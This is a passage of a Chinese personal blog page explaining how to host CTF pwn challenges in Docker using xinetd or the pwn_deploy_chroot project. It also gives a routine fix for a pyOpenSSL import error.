+<p><del>把 xinetd 下下来  ~</del><a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener"><del>https://github.com/Eadom/ctf_xinetd</del></a><br><del>题目复制到 bin 文件夹，把 ctf.xinetd 的命令改成运行的</del><br><del>（之前是 ./helloworld，改成自己的文件名）</del><br><del>xinetd 里面 Dockerfile 里面的清华的源不行，换成阿里的</del></p>
+<p><del>打开，把 pub_port 改成想要的端口</del><br><del><code>docker run -d -p &quot;0.0.0.0:pub_port:9999&quot; -h &quot;helloworld&quot; --name=&quot;helloworld&quot; helloworld</code></del></p>
+<p><strong>有个更好的方法：</strong></p>
+<p>把文件下载下来<br><code>git clone https://github.com/giantbranch/pwn_deploy_chroot.git</code></p>
+<p>然后把所有题目直接改好名字，放在  bin  文件夹<br>运行 <code>python initialize.py</code>  分配好  flag，会把分配的  flag  放在  flags.txt<br>运行  <code>docker-compose up --build -d</code></p>
+<p>同时每个题目对应的端口也会放在 flags.txt</p>
+<p>改  config.py 这个选项为 True  可以使用  cat flag  代替 /bin/sh  提高安全性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Whether to replace /bin/sh</span></span><br><span class="line">REPLACE_BINSH = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>安装 docker-compose<br><code>sudo apt install docker-compose</code></p>
+<p>拉起环境</p>
+<p><code>docker-compose up -d</code><br>docker-compose.yml 中查看端口，访问即可</p>
+<p>出现 AttributeError: ‘module’ object has no attribute ‘SSL_ST_INIT’问题：<br>解决：<br><code>rm -rf /usr/lib/python2.7/dist-packages/OpenSSL</code><br><code>rm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info</code><br><code>sudo pip install pyopenssl</code></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2019/12/20/fucdy1/" data-id="ckco50dd900042wu9hhh20fyk" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+
+                
+
+</article>
+        
+    </article>
+    
+  
+    
+      <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/page/6/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/8/">Next</a>
+      </nav>
+    
+  </section>
+</div>
+
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-bar-chart"></i> <span id="busuanzi_value_site_pv"></span></li>
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
